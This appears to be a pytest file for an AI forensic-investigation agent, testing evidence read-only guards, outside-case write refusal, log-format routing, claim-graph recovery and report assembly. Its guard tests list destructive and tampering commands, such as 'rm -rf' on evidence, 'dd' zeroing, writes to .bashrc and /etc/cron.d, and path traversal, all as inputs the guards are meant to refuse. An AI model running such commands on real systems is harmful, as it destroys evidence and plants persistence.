"""Pipeline hardening: context compaction, read-only evidence, delimited-text
routing, outputs confined to the case, rerun continuity, answer synthesis and
report integrity."""
import json
from unittest.mock import patch
import os
import time
from pathlib import Path

import pytest


# ── context: age-based compaction, superseding nudges ────────────────────


def _every_row(catalog):
    """Typed rows, prose-derived review rows and own assets alike: a
    belief's wording yields review rows, only a typed row is actionable."""
    return (list(catalog.get("iocs") or []) + list(catalog.get("review") or [])
            + list(catalog.get("affected_assets") or []))

def _conv(turns: int, tool_chars: int = 5000) -> list[dict]:
    msgs = [{"role": "system", "content": "playbook"},
            {"role": "user", "content": "case brief " * 20}]
    for t in range(turns):
        msgs.append({"role": "assistant", "content": f"thinking about turn {t} " * 10,
                     "tool_calls": [{"id": f"c{t}", "type": "function",
                                     "function": {"name": "x", "arguments": "{}"}}]})
        msgs.append({"role": "tool", "tool_call_id": f"c{t}", "content": "r" * tool_chars})
    return msgs


def test_aged_tool_results_are_stubbed_recent_ones_kept():
    from core.llm_check import compact_aged_messages, estimate_request_tokens
    msgs = _conv(60)
    before = estimate_request_tokens(msgs)
    n = compact_aged_messages(msgs, keep_tool_results=12, keep_turn_text=16)
    after = estimate_request_tokens(msgs)
    assert n > 0 and after < before * 0.4
    tools = [m for m in msgs if m["role"] == "tool"]
    assert all(len(m["content"]) == 5000 for m in tools[-12:])
    assert all(len(m["content"]) < 5000 for m in tools[:-12])
    assert msgs[0]["content"] == "playbook"                    # system untouched
    assert msgs[1]["content"].startswith("case brief")          # brief untouched


def test_compaction_is_idempotent():
    from core.llm_check import compact_aged_messages
    msgs = _conv(30)
    compact_aged_messages(msgs)
    assert compact_aged_messages(msgs) == 0


def test_nudge_supersedes_its_predecessor():
    from agent.loop import Agent as AgentLoop
    from core.llm_check import _TURN_STUB
    loop = AgentLoop.__new__(AgentLoop)
    loop.messages = [{"role": "system", "content": "s"}]
    loop._nudge("ioc", "search for 10.0.0.1")
    loop.messages.append({"role": "assistant", "content": "ok"})
    loop._nudge("ioc", "search for 10.0.0.1 and 10.0.0.2")
    loop._nudge("value", "read Security.evtx")
    contents = [m["content"] for m in loop.messages if m["role"] == "user"]
    assert contents == [_TURN_STUB, "search for 10.0.0.1 and 10.0.0.2", "read Security.evtx"]


# ── reasoning models are recognised by behaviour ─────────────────────────

def test_reasoning_is_recognised_from_the_reply_not_the_name():
    """A model's name says nothing about whether it thinks; its reply does.
    A reasoning count or thinking text on any reply marks the model as one
    that reasons, and the mark is what the settings page reports."""
    from agent import llm
    plain = llm.parse_response({"choices": [{"message": {"content": "ok"},
                                             "finish_reason": "stop"}],
                                "usage": {"completion_tokens": 1}})
    assert plain.thinking_observed is False
    thinker = llm.parse_response({"choices": [{"message": {"content": "ok"},
                                               "finish_reason": "stop"}],
                                  "usage": {"completion_tokens": 40,
                                            "reasoning_tokens": 38}})
    assert thinker.thinking_observed is True
    assert thinker.starved is False


def test_compact_user_message_is_bounded_and_asks_for_brevity():
    from tools.reasoning import _compact_user_message, _COMPACT_INPUT_CHARS
    out = _compact_user_message("F-001 " * 5000)
    assert len(out) < _COMPACT_INPUT_CHARS + 600
    assert "omitted for budget" in out and "Answer tersely" in out


# ── evidence is read-only ────────────────────────────────────────────────

@pytest.mark.parametrize("cmd", [
    ["touch", "/cases/X/evidence/a"],
    ["cp", "a", "/mnt/img/evidence/b"],
    ["rm", "-rf", "/cases/X/evidence"],
    ["sed", "-i", "s/a/b/", "/cases/X/evidence/a.csv"],
    ["tar", "-xf", "x.tar", "-C", "/cases/X/evidence/"],
    ["bash", "-c", "echo x > /cases/X/evidence/a"],
    ["sudo", "dd", "if=/dev/zero", "of=/cases/X/evidence/img.raw"],
])
def test_writers_naming_evidence_are_refused(cmd):
    from core.evidence_guard import refuse_evidence_write
    r = refuse_evidence_write(cmd)
    assert r and r["gate"] == "evidence_write_refused"


@pytest.mark.parametrize("cmd", [
    ["cat", "/cases/X/evidence/a.csv"],
    ["sed", "-n", "1,5p", "/cases/X/evidence/a.csv"],
    ["tar", "-tf", "/cases/X/evidence/x.tar"],
    ["cp", "/cases/X/evidence/a.csv", "/cases/X/analysis/a.csv"],   # reads evidence
    ["fls", "-r", "/cases/X/evidence/img.raw"],
    ["touch", "/cases/X/analysis/marker"],
])
def test_readers_and_analysis_writes_pass(cmd):
    from core.evidence_guard import refuse_evidence_write
    assert refuse_evidence_write(cmd) is None


def test_executor_refuses_a_result_that_changed_evidence(tmp_path):
    from core.executor import run
    from core.execution_log import log
    log.configure("AUDIT", str(tmp_path / "trace.json"))     # executor logs every call
    ev = tmp_path / "evidence"; ev.mkdir()
    (ev / "a.csv").write_text("a,b\n1,2\n")
    r = run(["python3", "-c", f"open('{ev}/side.txt','w').write('x')"], timeout=10)
    assert r["success"] is False
    assert any(c["change"] == "created" for c in r["evidence_modified"])
    assert "EVIDENCE MODIFIED" in r["stderr"]
    r = run(["cat", f"{ev}/a.csv"], timeout=10)
    assert r["success"] is True and "evidence_modified" not in r


# ── markdown from beliefs is inline only ─────────────────────────────────

@pytest.mark.parametrize("raw", ["x\n## Injected", "- list item", "```\ncode",
                                 "1. numbered", "> quoted", "# H1"])
def test_belief_text_cannot_add_markdown_structure(raw):
    from core.report_assemble import _md_inline, _MD_STRUCT_RE
    out = _md_inline(raw)
    assert "\n" not in out
    assert not _MD_STRUCT_RE.match(out)


def test_belief_text_pipes_are_literal():
    from core.report_assemble import _md_inline
    assert _md_inline("a | b") == "a \\| b"


# ── corrupted state is survivable ────────────────────────────────────────

def test_load_graph_drops_malformed_nodes(tmp_path):
    from core.claim_graph import load_graph, save_graph, empty_graph, list_nodes
    (tmp_path / ".atlas").mkdir()
    g = empty_graph()
    g["nodes"] = {"C1": {"id": "C1", "kind": "claim", "statement": "ok", "confidence": "LIKELY", "status": "new"},
                  "C2": None, "C3": "junk", "C4": {"id": "C4", "kind": "claim", "statement": 7, "confidence": "MAYBE"}}
    # written by hand: a corrupted file is what the reader has to survive
    (tmp_path / ".atlas" / "claim_graph.json").write_text(json.dumps(g))
    g2 = load_graph(tmp_path)
    ids = sorted(n["id"] for n in list_nodes(g2))
    assert ids == ["C1", "C4"]
    assert g2["nodes"]["C4"]["confidence"] == "UNCONFIRMED" and g2["nodes"]["C4"]["statement"] == "7"
    assert g2["meta"]["dropped_malformed_nodes"] == 2


def test_load_tasks_drops_junk_and_normalises_status(tmp_path):
    from core.investigation_tasks import load_tasks
    (tmp_path / ".atlas").mkdir()
    (tmp_path / ".atlas" / "investigation_tasks.json").write_text(json.dumps({
        "tasks": [{"id": "task-0001", "text": "Q", "status": "bogus"}, "junk", None,
                  {"id": "task-0002"}]}))
    tasks = load_tasks(tmp_path)["tasks"]
    assert [t["id"] for t in tasks] == ["task-0001"]
    assert tasks[0]["status"] == "open" and tasks[0]["related_claim_ids"] == []


# ── one "delimited text" verdict shared by every gate ────────────────────
# A semicolon-delimited .log must be taken by exactly one side: refused by
# strings ("query it instead") AND by table_schema ("not a tabular export"),
# it is readable by nothing.

def _fn(tool):
    return getattr(tool, "fn", tool)


def _write(tmp_path, name, text):
    p = tmp_path / name
    p.write_text(text, encoding="utf-8")
    return str(p)


def test_delimited_log_is_accepted_by_table_and_refused_by_byte_scanner(tmp_path):
    from core.input_kind import looks_delimited, refuse_raw_scan_of_structured_text
    from tools.tabular import table_schema
    log = _write(tmp_path, "fw.log",
                 "num;date;src;dst;action\n1;4Feb;10.0.0.1;1.1.1.1;accept\n"
                 "2;4Feb;10.0.0.2;1.1.1.1;drop\n3;4Feb;10.0.0.3;1.1.1.1;accept\n")
    assert looks_delimited(log)
    assert refuse_raw_scan_of_structured_text(log) is not None
    r = _fn(table_schema)(log)
    assert r.get("success"), r
    cols = r["sheets"]["-"]["columns"] if "-" in r["sheets"] else next(iter(r["sheets"].values()))["columns"]
    assert "action" in cols


def test_prose_log_is_refused_by_table_and_left_to_byte_scanner(tmp_path):
    from core.input_kind import looks_delimited, refuse_raw_scan_of_structured_text
    from tools.tabular import table_schema
    log = _write(tmp_path, "sys.log",
                 "Feb 4 00:00:00 host kernel: something happened here\n"
                 "Feb 4 00:00:01 host sshd[12]: Accepted publickey, for user, x\n"
                 "Feb 4 00:00:02 host cron: job ran\n")
    assert not looks_delimited(log)
    assert refuse_raw_scan_of_structured_text(log) is None
    r = _fn(table_schema)(log)
    assert r.get("success") is False and r.get("gate") == "wrong_input_kind"


def test_no_text_file_is_refused_by_both_gates(tmp_path):
    """Whatever the sniff says, exactly one side takes the file."""
    from core.input_kind import refuse_raw_scan_of_structured_text
    from tools.tabular import _refuse_nontabular
    samples = {
        "a.log": "x,y,z\n1,2,3\n4,5,6\n",
        "b.log": "just a line\nanother line\nthird\n",
        "c.out": "k|v|w\n1|2|3\n",
        "d.txt": "one line only\n",
        "e.log": "",
    }
    for name, text in samples.items():
        path = _write(tmp_path, name, text)
        table_refuses = _refuse_nontabular(path) is not None
        scanner_refuses = refuse_raw_scan_of_structured_text(path) is not None
        assert not (table_refuses and scanner_refuses), name


def test_profile_tabular_verdict_matches_table_tool(tmp_path):
    from core.evidence_profile import classify_path
    from tools.tabular import _kind
    log = _write(tmp_path, "export.log", "a;b;c;d;e\n1;2;3;4;5\n6;7;8;9;0\n")
    assert classify_path(Path(log)) == "tabular"
    assert _kind(log) == "csv"


def test_binary_is_never_sniffed_as_delimited(tmp_path):
    from core.input_kind import looks_delimited
    from tools.tabular import _kind
    p = tmp_path / "blob.bin"
    p.write_bytes(b";;;\x00;;;\n;;;\n;;;\n")
    assert not looks_delimited(str(p))
    assert _kind(str(p)) is None


# ── Windows text exports: UTF-16 / BOM / cp1252 ───────────────────────────
# A UTF-16 CSV (reg export, PowerShell Out-File) must not be refused by
# table.* as "contains NUL bytes", and a cp1252 export must keep its umlauts.

_CSV_TEXT = ("TimeCreated,EventId,Computer,UserName\n"
             "2031-02-04 10:41:03,4624,HOST01,CORP\\j.müller\n"
             "2031-02-04 10:43:00,4720,HOST01,CORP\\j.müller\n")


@pytest.mark.parametrize("name,payload,enc", [
    ("utf16le_bom.csv", b"\xff\xfe" + _CSV_TEXT.encode("utf-16-le"), "utf-16"),
    ("utf16be_bom.csv", b"\xfe\xff" + _CSV_TEXT.encode("utf-16-be"), "utf-16"),
    ("utf16le_nobom.csv", _CSV_TEXT.encode("utf-16-le"), "utf-16-le"),
    ("utf8_bom.csv", b"\xef\xbb\xbf" + _CSV_TEXT.encode("utf-8"), "utf-8-sig"),
    ("cp1252.csv", _CSV_TEXT.encode("cp1252"), "cp1252"),
    ("plain.csv", _CSV_TEXT.encode("utf-8"), "utf-8"),
])
def test_windows_text_exports_are_read_in_their_own_encoding(tmp_path, name, payload, enc):
    from core.input_kind import looks_delimited, text_encoding
    from tools.tabular import table_query, table_schema
    p = tmp_path / name
    p.write_bytes(payload)
    assert text_encoding(str(p)) == enc
    assert looks_delimited(str(p))
    r = _fn(table_schema)(str(p))
    assert r.get("success"), r
    assert next(iter(r["sheets"].values()))["columns"] == ["TimeCreated", "EventId", "Computer", "UserName"]
    q = _fn(table_query)(str(p), where=["EventId=4720"], limit=5)
    rows = q.get("rows") or q.get("results") or []
    assert len(rows) == 1 and rows[0]["UserName"] == "CORP\\j.müller", q


def test_utf16_delimited_log_is_routed_to_table_not_strings(tmp_path):
    from core.input_kind import refuse_raw_scan_of_structured_text
    from tools.tabular import _refuse_nontabular
    p = tmp_path / "fw.log"
    p.write_bytes(b"\xff\xfe" + "a;b;c;d\n1;2;3;4\n5;6;7;8\n".encode("utf-16-le"))
    assert refuse_raw_scan_of_structured_text(str(p)) is not None
    assert _refuse_nontabular(str(p)) is None


def test_real_binary_with_nul_is_still_refused_by_table(tmp_path):
    from core.input_kind import text_encoding
    from tools.tabular import _refuse_nontabular
    p = tmp_path / "hive.csv"          # mislabeled registry hive
    p.write_bytes(b"regf" + bytes(range(256)) * 8)
    assert text_encoding(str(p)) is None
    assert (_refuse_nontabular(str(p)) or {}).get("gate") == "wrong_input_kind"


def test_evidence_guard_sees_paths_with_spaces(tmp_path, monkeypatch):
    from core.evidence_guard import _paths_in
    d = tmp_path / "evidence" / "My Host"
    d.mkdir(parents=True)
    (d / "file.csv").write_text("x")
    monkeypatch.chdir(tmp_path)
    assert "evidence/My Host/file.csv" in _paths_in("evidence/My Host/file.csv")


def test_ledger_unit_ids_do_not_collide_on_non_ascii_names():
    from core.coverage_ledger import _add_unit, _unit_id
    a, b = "evidence/Benutzer_Müller.csv", "evidence/Benutzer_Möller.csv"
    assert _unit_id(a) != _unit_id(b)
    assert _unit_id("evidence/plain.csv") == "evidence/plain.csv"
    units = {}
    _add_unit(units, a, kind="tabular", reason="t")
    _add_unit(units, b, kind="tabular", reason="t")
    assert len(units) == 2


# ── outputs stay inside the case ──────────────────────────────────────────
# An output aimed outside the case — table_query(output_csv="/tmp/out.csv"),
# batch_run(["tee", "/home/x/.bashrc"]) — is refused like a write to
# evidence; refusing only evidence paths lets it through.

@pytest.fixture
def active_case(tmp_path):
    from core.execution_log import log
    case = tmp_path / "case"
    (case / "analysis").mkdir(parents=True)
    (case / "evidence").mkdir()
    (case / "evidence" / "a.csv").write_text("a,b,c\n1,2,3\n")
    prev = os.getcwd()
    log.configure("T", str(case / "analysis" / "trace.json"), save_session=False)
    os.chdir(case)
    try:
        yield case
    finally:
        os.chdir(prev)


def test_output_param_outside_the_case_is_refused(active_case):
    from core.paths import assert_output_safe
    assert_output_safe(str(active_case / "analysis" / "out.csv"))
    assert_output_safe("analysis/rel.csv")
    # (the temp dir is an allowed scratch root, so aim past it)
    for bad in ("/home/someone/.bashrc", "/etc/cron.d/x", "~/x.csv",
                "../../../../../../../var/escape.csv"):
        with pytest.raises(ValueError, match="outside the case"):
            assert_output_safe(bad)


def test_output_param_through_symlink_out_of_the_case_is_refused(active_case, tmp_path):
    from core.paths import assert_output_safe
    outside = tmp_path / "elsewhere"
    outside.mkdir()
    (active_case / "analysis" / "link").symlink_to(outside)
    # the temp dir itself is an allowed root, so aim beyond it
    (active_case / "analysis" / "home").symlink_to("/")
    with pytest.raises(ValueError, match="outside the case"):
        assert_output_safe(str(active_case / "analysis" / "home" / "etc" / "x"))


@pytest.mark.parametrize("cmd,refused", [
    (["tee", "/home/someone/.bashrc"], True),
    (["cp", "evidence/a.csv", "../../../../../../../var/leak.csv"], True),
    (["cp", "-t", "/var/leak", "evidence/a.csv"], True),
    (["cp", "-t", "analysis/", "evidence/a.csv"], False),
    (["touch", "analysis/new.txt"], False),
    (["mkdir", "-p", "analysis/sub"], False),
    (["sed", "-i", "s/a/b/", "analysis/x.txt"], False),
    (["python3", "-c", "open('/home/someone/x','w').write('1')"], True),
    (["python3", "-c", "open('analysis/x','w').write('1')"], False),
    (["tar", "-xf", "evidence/kape.tar", "-C", "analysis/"], False),   # was a false refusal
    (["tar", "xf", "evidence/kape.tar", "-C", "/home/someone"], True),
    (["tar", "-czf", "/home/someone/out.tgz", "analysis"], True),
    (["tar", "-czf", "exports/out.tgz", "analysis"], False),
    (["tar", "-tf", "evidence/kape.tar"], False),
    (["unzip", "evidence/kape.zip", "-d", "analysis/kape"], False),
    (["unzip", "evidence/kape.zip", "-d", "/opt/x"], True),
    (["7z", "x", "evidence/a.7z", "-oanalysis/a"], False),
    (["gunzip", "-c", "evidence/a.gz"], False),
    (["dd", "if=evidence/a.csv", "of=/home/someone/a.raw"], True),
    (["cat", "/etc/hostname"], False),                                  # not a writer
])
def test_batch_run_writes_stay_inside_the_case(active_case, cmd, refused):
    from core.evidence_guard import refuse_outside_case_write
    r = refuse_outside_case_write(cmd)
    assert (r is not None) == refused, (cmd, r)
    if r:
        assert r["gate"] == "outside_case_write_refused"


@pytest.mark.parametrize("cmd,refused", [
    (["tar", "-xf", "evidence/kape.tar", "-C", "analysis/"], False),
    (["tar", "-xf", "evidence/kape.tar", "-C", "evidence/"], True),
    (["unzip", "evidence/kape.zip"], True),          # extracts into cwd; refused only under a read-only prefix
    (["gzip", "evidence/a.csv"], True),
    (["gzip", "-c", "evidence/a.csv"], False),
    (["cp", "evidence/a.csv", "analysis/a.csv"], False),
    (["cp", "analysis/a.csv", "evidence/a.csv"], True),
    (["sed", "-i", "s/a/b/", "analysis/x"], False),   # a script is not a path
    (["sed", "-i", "s/a/b/", "evidence/a.csv"], True),
])
def test_evidence_write_rule_knows_where_archivers_write(active_case, cmd, refused, monkeypatch):
    from core import evidence_guard
    from core.paths import is_evidence_path
    # "unzip into cwd" is only an evidence write when the case root itself
    # is read-only (e.g. under /cases/); model that for the bare unzip above.
    if cmd == ["unzip", "evidence/kape.zip"]:
        monkeypatch.setattr(evidence_guard, "is_evidence_path",
                            lambda p: True if os.path.realpath(p) == str(active_case) else is_evidence_path(p))
    r = evidence_guard.refuse_evidence_write(cmd)
    assert (r is not None) == refused, (cmd, r)


def test_no_refusal_outside_a_run(tmp_path, monkeypatch):
    from core import evidence_guard
    monkeypatch.setattr(evidence_guard, "active_case_dir", lambda: None)
    assert evidence_guard.refuse_outside_case_write(["tee", "/home/someone/x"]) is None


def test_case_request_text_drops_markdown_emphasis():
    from core.investigation_tasks import parse_case_requests
    md = ("## Investigation Requests\n- **Was the host compromised?**\n"
          "- Which *accounts* were created?\n- Plain question?\n- __Bold__ and _it_\n")
    assert parse_case_requests(md) == [
        "Was the host compromised?", "Which accounts were created?",
        "Plain question?", "Bold and it"]


# ── rerun continuity: ids, latch, brief ───────────────────────────────────
# After a trace reset a new finding can reuse an old finding's call id and
# must not match and overwrite the old claim; the starvation latch must not
# fire on a case that already holds claims; the rerun brief must list the
# findings the case already has.

def _graph_with_claims(case: Path, n: int = 2, call_base: int = 40):
    from core.claim_graph import save_graph, empty_graph
    g = empty_graph()
    for i in range(1, n + 1):
        g["nodes"][f"C{i:04d}"] = {
            "id": f"C{i:04d}", "kind": "claim", "status": "new",
            "confidence": "LIKELY", "host": "HOST01",
            "statement": f"Account user{i} logged on at 2031-02-04 10:4{i}:03 UTC (EID 4624)",
            "finding_call_id": call_base + i,
            "evidence": [{"artifact": "trace_call", "call_id": call_base + i + 100}],
        }
    save_graph(case, g)
    return g


def test_call_ids_continue_past_the_claim_graph_after_a_trace_reset(tmp_path):
    from core.execution_log import _case_max_call_id
    case = tmp_path / "case"
    (case / ".atlas").mkdir(parents=True)
    assert _case_max_call_id(str(case)) == 0
    _graph_with_claims(case, 2, call_base=40)
    assert _case_max_call_id(str(case)) == 142


def test_fresh_trace_seq_starts_above_persisted_claims(tmp_path):
    from core.execution_log import ExecutionLog
    case = tmp_path / "case"
    (case / ".atlas").mkdir(parents=True)
    (case / "analysis").mkdir()
    _graph_with_claims(case, 1, call_base=70)
    lg = ExecutionLog()
    lg.configure("T", str(case / "analysis" / "trace.json"), save_session=False)
    assert lg._seq >= 171


def test_latch_does_not_fire_on_a_case_that_already_holds_claims(tmp_path):
    from agent.belief_starvation import starvation_latched
    case = tmp_path / "case"
    (case / ".atlas").mkdir(parents=True)
    contacts = [{"type": "tool_call", "tool": "table_table_query", "success": True,
                 "result": '{"matched_rows": 5}'} for _ in range(4)]
    assert starvation_latched(contacts) is True
    assert starvation_latched(contacts, case_dir=str(case)) is True
    _graph_with_claims(case, 1)
    assert starvation_latched(contacts, case_dir=str(case)) is False


def test_rerun_brief_lists_existing_findings(tmp_path):
    from core.rerun_brief import build_rerun_brief
    case = tmp_path / "case"
    (case / ".atlas").mkdir(parents=True)
    (case / "evidence").mkdir()
    (case / "CASE.md").write_text("# Case: T\n\n**Case ID:** T\n\n## Investigation Requests\n- What happened?\n", encoding="utf-8")
    _graph_with_claims(case, 2)
    from core.incremental import plane_a_scan
    text = build_rerun_brief(case, plane_a_scan(case, persist=True))["text"]
    assert "Existing findings (2)" in text
    assert "C0001" in text and "C0002" in text


# ── confidence: technique ids and lineage-wide auto-cite ─────────────────

def test_technique_ids_are_not_uncited_claims():
    from tools._gates._citation import deterministic_cite_check
    r = deterministic_cite_check(
        "CORP\\a.roe created tempadmin at 10:43 (T1136.001), from 10.9.8.7",
        "row: 10.9.8.7 a.roe 4720")
    assert r["verdict"] == "ALL_CITED", r


# ── entities: version numbers and people are not files ───────────────────

def test_file_entities_need_a_real_extension():
    from core.entities import extract
    ents = extract("CORP\\a.roe ran rclone.exe v1.70 (build 2.2) and read notes.txt")
    assert "file:rclone.exe" in ents and "file:notes.txt" in ents
    assert not any(e in ents for e in ("file:v1.70", "file:2.2", "file:a.roe"))


# ── headline: colons inside times and drive letters ──────────────────────

def test_headline_keeps_drive_letters_and_clock_times():
    from core.answer_synthesis import headline
    h = headline("HOST01\\tempadmin executed rclone.exe to copy D:\\Projects to a remote bucket at 2031-02-04 13:02:00 UTC and then more words follow here to exceed the limit", limit=80)
    assert "copy D" not in h or "D:\\Projects" in h
    h2 = headline("Event log shows the following: 1x EID 4720 and lots of other events that make this long enough to cut", limit=80)
    assert h2 == "Event log shows the following"


# ── answers: a general question gets an overview, never "Not answered" ──

def test_general_question_is_answered_with_an_overview(tmp_path):
    from core.answer_synthesis import answer_for_task
    case = tmp_path / "case"
    (case / ".atlas").mkdir(parents=True)
    g = _graph_with_claims(case, 3)
    ans = answer_for_task({"text": "What happened on the host?", "related_claim_ids": []}, g)
    assert ans["has_answer"] and ans["overview"] and ans["verdict"] == "Overview"
    assert len(ans["supporting"]) == 3
    for q in ("Did 10.9.8.7 log on?", "Was data exfiltrated?", "q"):
        specific = answer_for_task({"text": q, "related_claim_ids": []}, g)
        assert not specific["has_answer"] and not specific.get("overview"), q
    # An open question whose subject the findings speak to gets them as
    # related material, marked as such — never as a verdict.
    acc = answer_for_task({"text": "Which accounts were created?", "related_claim_ids": []}, g)
    assert acc["has_answer"] and acc["by_relevance"] and acc["verdict"] == "Related findings" and not acc.get("overview")
    de = answer_for_task({"text": "Was ist auf dem Host passiert?", "related_claim_ids": []}, g, language="de")
    assert de["overview"]


def test_report_marks_overview_answers(tmp_path):
    from core.investigation_tasks import reconcile_case_md
    from core.report_assemble import assemble_client_report
    case = tmp_path / "case"
    (case / ".atlas").mkdir(parents=True)
    (case / "evidence").mkdir()
    (case / "CASE.md").write_text("# Case: T\n\n**Case ID:** T\n\n## Investigation Requests\n- What happened on the host?\n", encoding="utf-8")
    reconcile_case_md(case)
    _graph_with_claims(case, 2)
    md = assemble_client_report(case)
    assert "Not answered" not in md
    assert "Overview drawn from all findings" in md


# ── a run that ends without a report still produces one ──────────────────

def test_run_end_auto_assembles_a_report(tmp_path, capsys):
    from agent.cli import _ensure_report_on_exit
    from core.report_projection import load_manifest
    case = tmp_path / "case"
    (case / ".atlas").mkdir(parents=True)
    (case / "evidence").mkdir()
    (case / "CASE.md").write_text("# Case: T\n\n**Case ID:** T\n\n## Investigation Requests\n- What happened?\n", encoding="utf-8")
    _graph_with_claims(case, 2)

    class FakeAgent:
        stats = {"stopped_reason": "turn_cap"}
        def _report_written(self):
            return False
    agent = FakeAgent()
    import core.report_projection as rp
    rp._PROVIDER_DOWN_UNTIL[0] = 0.0
    _orig = rp.default_llm_section_generator
    rp.default_llm_section_generator = lambda ctx, sec: (_ for _ in ()).throw(RuntimeError("no provider"))
    try:
        _ensure_report_on_exit(case, agent)
    finally:
        rp.default_llm_section_generator = _orig
        rp._PROVIDER_DOWN_UNTIL[0] = 0.0
    out = case / "reports" / "T_investigation_report.md"
    assert out.is_file()
    text = out.read_text(encoding="utf-8")
    assert "Written at run end (turn_cap)" in text and ("C0001" in text or "F-001" in text)
    # no provider in the test environment: projected with deterministic stubs
    assert load_manifest(case)["last_deliverable_source"] in ("projected_on_exit", "projected_on_exit_with_fallbacks")
    assert agent.stats["auto_report"] == str(out)

    class Written(FakeAgent):
        def _report_written(self):
            return True
    out.unlink()
    _ensure_report_on_exit(case, Written())
    assert not out.exists()


# ── clear_case_run archives the audit trail instead of deleting it ───────

def test_clear_case_run_archives_trace_and_transcript(tmp_path):
    from tools.misc import clear_case_run
    case = tmp_path / "case"
    (case / ".atlas").mkdir(parents=True)
    (case / "evidence").mkdir()
    (case / "analysis").mkdir()
    (case / "analysis" / "agent_transcript_20310204T000000Z.jsonl").write_text("{}\n")
    # A chat about the case is an audit trail too, not scratch output.
    (case / "analysis" / "chat_transcript_20310204T000100Z.jsonl").write_text("{}\n")
    (case / "analysis" / "T_trace.jsonl").write_text("{}\n")
    (case / "analysis" / "scratch.txt").write_text("x")
    r = clear_case_run(str(case), clear_memory=False)
    assert r["success"], r
    archived = list((case / ".atlas" / "run_history").glob("trace-*/*"))
    names = sorted(p.name for p in archived)
    assert names == ["T_trace.jsonl", "agent_transcript_20310204T000000Z.jsonl",
                     "chat_transcript_20310204T000100Z.jsonl"]
    assert not (case / "analysis" / "scratch.txt").exists()


# ── orchestrator: delimited .log is planned as a table ───────────────────

def test_orchestrator_plans_delimited_log_as_tabular(tmp_path, monkeypatch):
    from core.investigation_orchestrator import _path_capabilities
    monkeypatch.chdir(tmp_path)
    (tmp_path / "evidence").mkdir()
    fw = tmp_path / "evidence" / "fw.log"
    fw.write_text("a;b;c;d\n1;2;3;4\n5;6;7;8\n")
    assert _path_capabilities("evidence/fw.log")[0] == "tabular_export_analysis"
    prose = tmp_path / "evidence" / "sys.log"
    prose.write_text("just a line\nanother one\n")
    assert _path_capabilities("evidence/sys.log") == ["static_file_triage"]


def test_tiny_nul_file_is_binary_not_utf16(tmp_path):
    from core.input_kind import _looks_like_text_file, text_encoding
    p = tmp_path / "stub"
    p.write_bytes(b"\x00")
    assert text_encoding(str(p)) is None and not _looks_like_text_file(str(p))


# ── a universal or negative statement needs a complete view ──────────────
# "All N rows are X" or "no Y detected" may only rest on a view that showed
# every matched row, never on a query that returned a part of them.

class _Idx:
    def __init__(self, entries):
        self.by_call_id = {e["call_id"]: e for e in entries}
        self.by_type = {}


class _Ctx:
    def __init__(self, description, entries, input_call_ids=(), linked=0, tier="SUSPECTED"):
        self.description = description
        self.confidence = tier
        self.tier = tier
        self.input_call_ids = list(input_call_ids)
        self.linked_call_id = linked
        self.idx = _Idx(entries)


def test_universal_claim_on_partial_result_is_refused():
    from tools._gates.universal_from_truncated import check
    partial = {"call_id": 10, "type": "tool_call", "cmd": "<py>:table_table_query",
               "result_meta": {"matched_rows": 60, "returned_rows": 25}}
    full = {"call_id": 11, "type": "tool_call", "cmd": "<py>:table_table_pivot",
            "result_meta": {"matched_rows": 60, "returned_rows": 60}}
    cut = {"call_id": 12, "type": "tool_call", "cmd": "<py>:table_table_grep",
           "view_truncated": True}
    r = check(_Ctx("All 60 logon events were LogonType 2; no network logons detected",
                   [partial, full], input_call_ids=[10]))
    assert r and r["gate"] == "universal_from_truncated" and r["incomplete_call_id"] == 10
    assert check(_Ctx("All 60 logon events were LogonType 2", [partial, full], input_call_ids=[11])) is None
    assert check(_Ctx("Keine Netzwerkanmeldungen wurden gefunden", [cut], linked=12)) is not None
    # a positive observation of a seen row is untouched, whatever the view
    assert check(_Ctx("CORP\\a.roe logged on from 10.9.8.7 at 10:41:03 (EID 4624)",
                      [partial], input_call_ids=[10])) is None


def test_closeout_tools_are_exempt_from_the_wrapup_ration():
    from agent.loop import _CLOSEOUT_TOOL_RE
    for name in ("misc_record_finding", "reason_reason_pre_report_check",
                 "misc_write_projected_final_report", "misc_export_execution_log",
                 "atlas_finish", "dair_dair_assess", "coverage_coverage_report",
                 "table_table_schema", "misc_update_investigation_task"):
        assert _CLOSEOUT_TOOL_RE.search(name), name
    for name in ("table_table_query", "table_table_grep", "misc_batch_run",
                 "ez_ez_evtxecmd", "strings_strings_grep", "tsk_fls"):
        assert not _CLOSEOUT_TOOL_RE.search(name), name


# ── answers read as answers ──────────────────────────────────────────────

def test_yes_no_questions_lead_with_the_answer_and_the_relevant_claim():
    from core.answer_synthesis import synthesize_answer
    claims = [
        {"statement": "PsExec (psexec64.exe) was present in c:\\users\\tempadmin\\downloads", "confidence": "SUSPECTED"},
        {"statement": "New local account HOST01\\tempadmin was created by CORP\\a.roe at 2031-02-04 10:43:00 UTC (EID 4720)", "confidence": "SUSPECTED"},
    ]
    r = synthesize_answer("Was a new account created, and by whom?", claims)
    assert r["text"].startswith("Yes — ")
    assert r["points"][0].startswith("New local account")
    de = synthesize_answer("Wurde ein neues Konto angelegt?", claims, language="de")
    assert de["text"].startswith("Ja — ")
    open_q = synthesize_answer("What happened on the host?", claims)
    assert not open_q["text"].startswith(("Yes", "No"))


def test_headline_prefers_a_clause_boundary():
    from core.answer_synthesis import headline
    h = headline("HOST01\\tempadmin cleared the Windows Security audit log at 2031-02-04 13:40:00 UTC — Security EID 1102 recorded by the exporter", limit=96)
    assert h.rstrip("…") == "HOST01\\tempadmin cleared the Windows Security audit log at 2031-02-04 13:40:00 UTC"


# ── the trace records how much of a result the model could see ───────────

def test_result_meta_is_read_from_mcp_tool_results():
    from core.middleware import _result_meta

    class Part:
        def __init__(self, text): self.text = text

    class ToolResult:
        structured_content = None
        content = [Part('{"success": true, "matched_rows": 60, "returned_rows": 25, "rows": []}')]
    assert _result_meta(ToolResult()) == {"matched_rows": 60, "returned_rows": 25}
    assert _result_meta({"hit_count": 50, "max_hits": 50, "x": "y"}) == {"hit_count": 50, "max_hits": 50}
    assert _result_meta("nope") == {}


def test_view_truncation_is_stamped_on_the_trace_entry(tmp_path):
    from agent.toolbox import _trace_calls_since, _trace_seq, _truncate
    from core.execution_log import log
    case = tmp_path / "case"
    (case / "analysis").mkdir(parents=True)
    log.configure("T", str(case / "analysis" / "trace.json"), save_session=False)
    before = _trace_seq()
    cid = log.record_tool_call(cmd="<py>:table_table_query", success=True, truncated=False,
                               retries=0, exit_code=0)
    assert _trace_calls_since(before) == [cid]
    out = _truncate("x" * 5000, limit=1000, call_ids=[cid])
    assert "characters omitted" in out
    entry = next(e for e in log._entries if e.get("call_id") == cid)
